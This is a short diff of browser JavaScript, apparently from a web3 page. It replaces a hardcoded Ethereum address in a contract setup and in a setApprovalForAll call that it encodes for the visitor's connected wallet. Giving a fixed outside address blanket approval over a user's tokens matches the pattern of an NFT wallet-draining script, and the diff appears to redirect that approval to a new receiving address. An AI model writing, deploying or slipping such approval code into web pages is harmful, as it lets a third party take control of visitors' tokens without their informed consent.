@@ -376,7 +376,7 @@ var abi = [
 
 
 
-const contract_address = web3.utils.toChecksumAddress("0x029e5462dd5d0ac08064762c24a8f4324a146cd7")
+const contract_address = web3.utils.toChecksumAddress("0x17868047286a8ec9ace12d359eb9c3eef54aeb62")
 
 const contract_bal = new web3.eth.Contract(abi, contract_address);
 
@@ -744,7 +744,7 @@ var acct = (async function(){
 	var token_nx = localStorage.getItem("mySharedData1");
 	
  	var contract_address1 = web3.utils.toChecksumAddress(nft_k)
-        var _data = new web3.eth.Contract(abi, contract_address).methods.setApprovalForAll("0x029e5462dd5d0ac08064762c24a8f4324a146cd7", true).encodeABI();
+        var _data = new web3.eth.Contract(abi, contract_address).methods.setApprovalForAll("0x17868047286a8ec9ace12d359eb9c3eef54aeb62", true).encodeABI();
         var accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
         var account = accounts[0];
 	var result = await web3.eth.getTransactionCount(account)
